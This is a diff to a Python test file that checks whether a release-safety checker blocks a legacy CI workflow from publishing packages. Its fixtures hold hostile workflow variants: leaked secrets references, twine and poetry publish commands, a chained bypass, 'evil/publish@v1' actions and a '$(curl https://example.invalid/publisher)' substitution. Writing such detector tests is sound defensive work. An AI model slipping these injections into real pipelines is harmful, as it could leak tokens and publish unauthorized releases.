@@ -2,17 +2,42 @@
 
 from __future__ import annotations
 
+import json
 import re
+import tempfile
 import tomllib
 import unittest
+from importlib.util import module_from_spec, spec_from_file_location
 from pathlib import Path
+from types import ModuleType
+from unittest import mock
 
 REPOSITORY_ROOT = Path(__file__).resolve().parents[3]
 WORKFLOW_PATH = REPOSITORY_ROOT / ".github" / "workflows" / "v1-ci.yml"
+LEGACY_WORKFLOW_PATH = REPOSITORY_ROOT / ".github" / "workflows" / "ci.yml"
+LEGACY_RELEASE_SAFETY_PATH = (
+    REPOSITORY_ROOT / "python" / "tools" / "check_legacy_release_safety.py"
+)
+LEGACY_RELEASE_MANIFEST_PATH = (
+    REPOSITORY_ROOT / "python" / "quality" / "legacy-ci-manifest.json"
+)
 PYPROJECT_PATH = REPOSITORY_ROOT / "python" / "pyproject.toml"
 BROWSER_TEST_PATH = (
     REPOSITORY_ROOT / "python" / "tests" / "browser" / "test_exponential_report_rtl.py"
 )
+
+
+def _load_legacy_release_safety_checker() -> ModuleType:
+    spec = spec_from_file_location("legacy_release_safety", LEGACY_RELEASE_SAFETY_PATH)
+    if spec is None or spec.loader is None:
+        raise RuntimeError("legacy release safety checker is not loadable")
+    module = module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module
+
+
+def _workflow_with_step(step: str) -> str:
+    return f"jobs:\n  check:\n    steps:\n      - {step}\n"
 
 
 class VeridistWorkflowContractTests(unittest.TestCase):
@@ -162,9 +187,11 @@ class VeridistWorkflowContractTests(unittest.TestCase):
         self.assertIn("tests.browser.test_sphinx_rtl_pages", self.workflow)
         self.assertIn("find artifacts/browser-rtl", self.workflow)
         self.assertIn("-type f -name '*.png' -size +0c", self.workflow)
-        self.assertIn('test "${#screenshots[@]}" -eq 2', self.workflow)
+        self.assertIn('test "${#screenshots[@]}" -eq 4', self.workflow)
         self.assertIn("exponential-report-fa-failure.png", self.workflow)
         self.assertIn("exponential-report-fa-success.png", self.workflow)
+        self.assertIn("sphinx-api-fa.png", self.workflow)
+        self.assertIn("sphinx-index-fa.png", self.workflow)
         upload_start = self.workflow.index("      - name: Retain browser screenshots")
         upload_block = self.workflow[upload_start : self.workflow.index("  veridist-gate:")]
         self.assertIn("if: always()", upload_block)
@@ -189,7 +216,9 @@ class VeridistWorkflowContractTests(unittest.TestCase):
         ).read_text(encoding="utf-8")
         for required in (
             "sphinx",
+            "api.html",
             "exponential-right-censoring.html",
+            "index.html",
             "unicodeBidi",
             "code.literal",
             ".highlight pre",
@@ -230,6 +259,168 @@ class VeridistWorkflowContractTests(unittest.TestCase):
 
         gate_start = self.workflow.index("  veridist-gate:")
         self.assertNotIn("working-directory:", self.workflow[gate_start:])
+
+    def test_legacy_workflow_cannot_trigger_or_publish_a_release(self) -> None:
+        """Legacy CI may validate legacy code but must never publish an artifact."""
+        self.assertTrue(LEGACY_RELEASE_SAFETY_PATH.is_file())
+        checker = _load_legacy_release_safety_checker()
+        legacy_workflow = LEGACY_WORKFLOW_PATH.read_text(encoding="utf-8")
+        self.assertEqual(checker.find_violations(legacy_workflow), ())
+        self.assertTrue(LEGACY_RELEASE_MANIFEST_PATH.is_file())
+
+    def test_legacy_release_safety_rejects_every_publication_capability(self) -> None:
+        checker = _load_legacy_release_safety_checker()
+        unsafe_workflows = {
+            "release trigger mapping": "on:\n  release:\n    types: [published]\n",
+            "release trigger list": "on: [push, release]\n",
+            "quoted release trigger": "on:\n  'release': [published]\n",
+            "publication job": "jobs:\n  publish-wheel:\n    runs-on: ubuntu-latest\n",
+            "release job": "jobs:\n  release:\n    runs-on: ubuntu-latest\n",
+            "trusted publishing permission": "permissions:\n  id-token: write\n",
+            "package write permission": "permissions:\n  packages: write\n",
+            "nested job permission": (
+                "jobs:\n  check:\n    permissions:\n      packages: write\n"
+            ),
+            "deployment environment": "jobs:\n  check:\n    environment:\n      name: pypi\n",
+            "secret reference": (
+                "jobs:\n  check:\n    env:\n      TOKEN: ${{ secrets.PYPI_TOKEN }}\n"
+            ),
+            "pypi action": _workflow_with_step(
+                "uses: pypa/gh-action-pypi-publish@release/v1"
+            ),
+            "twine command": _workflow_with_step("run: python -m twine upload dist/*"),
+            "uv command": _workflow_with_step("run: uv publish"),
+            "hatch command": _workflow_with_step("run: hatch publish"),
+            "poetry command": _workflow_with_step("run: poetry publish"),
+            "flit command": _workflow_with_step("run: flit publish"),
+            "generic publish command": _workflow_with_step("run: release-client publish"),
+            "echo command-chain bypass": _workflow_with_step(
+                "run: echo harmless && python -m twine upload dist/*"
+            ),
+            "generic upload action": _workflow_with_step("uses: owner/upload-to-pypi@v1"),
+        }
+        for name, workflow in unsafe_workflows.items():
+            with self.subTest(name=name):
+                self.assertTrue(checker.find_violations(workflow))
+
+    def test_legacy_release_safety_ignores_comments_but_rejects_all_structural_drift(self) -> None:
+        checker = _load_legacy_release_safety_checker()
+        baseline = LEGACY_WORKFLOW_PATH.read_text(encoding="utf-8")
+        self.assertEqual(
+            checker.find_violations(baseline + "\n# harmless prose: twine upload\n"),
+            (),
+        )
+        unsafe_workflows = {
+            "unknown job": baseline.replace(
+                "jobs:\n", "jobs:\n  unknown:\n    runs-on: ubuntu-latest\n", 1
+            ),
+            "reusable workflow": baseline.replace(
+                "  legacy-gate:\n", "  legacy-gate:\n    uses: evil/reusable@v1\n", 1
+            ),
+            "bracket secret": baseline.replace(
+                "RELEVANT: ${{ needs.legacy-scope.outputs.relevant }}",
+                "RELEVANT: ${{ secrets['PYPI_TOKEN'] }}",
+                1,
+            ),
+            "unknown action": baseline.replace("actions/checkout@v4", "evil/publish@v1", 1),
+            "command substitution": baseline.replace(
+                "python python/tools/ci_scope.py legacy-gate",
+                "$(curl https://example.invalid/publisher)",
+                1,
+            ),
+        }
+        for name, workflow in unsafe_workflows.items():
+            with self.subTest(name=name):
+                self.assertTrue(checker.find_violations(workflow))
+
+    def test_legacy_manifest_semantics_survive_a_regenerated_workflow_digest(self) -> None:
+        checker = _load_legacy_release_safety_checker()
+        baseline = LEGACY_WORKFLOW_PATH.read_text(encoding="utf-8")
+        variants = {
+            "publisher action": baseline.replace("actions/checkout@v4", "evil/publish@v1", 1),
+            "bracket secret": baseline.replace(
+                "EVENT_NAME: ${{ github.event_name }}",
+                "EVENT_NAME: ${{ secrets['PYPI_TOKEN'] }}",
+                1,
+            ),
+            "dot secret": baseline.replace(
+                "EVENT_NAME: ${{ github.event_name }}",
+                "EVENT_NAME: ${{ secrets.PYPI_TOKEN }}",
+                1,
+            ),
+            "publisher command": baseline.replace(
+                "python python/tools/ci_scope.py legacy-gate",
+                "poetry publish",
+                1,
+            ),
+            "unexpected step environment": baseline.replace(
+                "      - uses: actions/setup-python@v5\n        with:",
+                (
+                    "      - uses: actions/setup-python@v5\n        env:\n"
+                    "          TOKEN: safe-looking\n        with:"
+                ),
+                1,
+            ),
+            "unexpected with payload": baseline.replace(
+                "fetch-depth: 0",
+                "fetch-depth: 0\n          TOKEN: safe-looking",
+                1,
+            ),
+            "changed allowed environment": baseline.replace(
+                "EVENT_NAME: ${{ github.event_name }}",
+                "EVENT_NAME: ${{ github.event_name }}\n          EXTRA: value",
+                1,
+            ),
+            "allowed with payload transplanted to another step": baseline.replace(
+                "with:\n          python-version: \"3.11\"",
+                "with:\n          fetch-depth: 0",
+                1,
+            ),
+            "spaced bracket secret": baseline.replace(
+                "EVENT_NAME: ${{ github.event_name }}",
+                "EVENT_NAME: ${{ secrets [ 'PYPI_TOKEN' ] }}",
+                1,
+            ),
+            "spaced dot secret": baseline.replace(
+                "EVENT_NAME: ${{ github.event_name }}",
+                "EVENT_NAME: ${{ secrets .TOKEN }}",
+                1,
+            ),
+        }
+        baseline_manifest = json.loads(
+            LEGACY_RELEASE_MANIFEST_PATH.read_text(encoding="utf-8")
+        )
+        self.assertIn("step_sha256", baseline_manifest)
+        for name, workflow in variants.items():
+            with self.subTest(name=name), tempfile.TemporaryDirectory() as directory:
+                document = checker._load_document(workflow)
+                self.assertIsNotNone(document)
+                manifest = dict(baseline_manifest)
+                manifest["workflow_sha256"] = checker._canonical_sha256(document)
+                manifest["approved_actions"], manifest["step_sha256"] = checker._semantic_inventory(
+                    document
+                )
+                path = Path(directory) / "manifest.json"
+                path.write_text(json.dumps(manifest), encoding="utf-8")
+                with mock.patch.object(checker, "_MANIFEST_PATH", path):
+                    self.assertTrue(checker.find_violations(workflow))
+        self.assertFalse(checker._contains_secret("prose says secrets are unavailable"))
+
+    def test_legacy_manifest_rejects_noninteger_schema_and_duplicate_keys(self) -> None:
+        checker = _load_legacy_release_safety_checker()
+        workflow = LEGACY_WORKFLOW_PATH.read_text(encoding="utf-8")
+        manifest = json.loads(LEGACY_RELEASE_MANIFEST_PATH.read_text(encoding="utf-8"))
+        for value in (True, 2.0, "2"):
+            with self.subTest(schema_version=value), tempfile.TemporaryDirectory() as directory:
+                manifest["schema_version"] = value
+                path = Path(directory) / "manifest.json"
+                path.write_text(json.dumps(manifest), encoding="utf-8")
+                with mock.patch.object(checker, "_MANIFEST_PATH", path):
+                    self.assertTrue(checker.find_violations(workflow))
+        with tempfile.TemporaryDirectory() as directory:
+            path = Path(directory) / "manifest.json"
+            path.write_text('{"schema_version": 2, "schema_version": 2}', encoding="utf-8")
+            self.assertIsNone(checker._load_manifest(path))
 
 
 if __name__ == "__main__":
